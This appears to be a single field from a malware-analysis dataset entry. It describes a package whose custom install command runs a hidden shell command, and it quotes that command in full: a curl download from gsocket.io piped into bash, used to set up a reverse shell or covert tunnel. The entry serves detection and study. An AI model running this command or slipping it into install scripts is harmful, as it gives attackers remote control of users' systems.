      "malicious_behavior": "This code is malicious. During the installation process (via the custom install command class), it executes a function that runs a shell command: S=\"JDTztYg5XJktxJMuSd61zGHACKERTAUXGREP123\" bash -c \"$(curl -fsSL gsocket.io/x)\" > /dev/null. This command downloads and executes a remote script from gsocket.io, which is a known tool for establishing reverse shells or covert network tunnels. This behavior is a classic example of a supply chain attack, where malicious code is hidden in a package's setup script to compromise the system during installation. The use of obfuscated variable and class names further indicates an attempt to evade detection.",
